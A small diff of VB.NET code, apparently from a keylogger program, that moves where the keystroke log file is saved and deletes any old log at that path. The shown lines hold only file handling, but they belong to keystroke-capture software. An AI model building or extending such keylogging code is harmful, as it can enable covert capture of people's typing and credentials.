@@ -50,7 +50,7 @@ Public Class Main
                 kbHook.FinalizeHK()
             End If
             Dim fileName As String = "usr" & UID & "_" & DateTime.Now.ToString("hhmmssddMMyyyy") & "_Keylogger.log"
-            Dim filePath As String = DIRCommons & "\" & fileName
+            Dim filePath As String = DIRHome & "\" & fileName
             If My.Computer.FileSystem.FileExists(filePath) Then
                 My.Computer.FileSystem.DeleteFile(filePath)
             End If
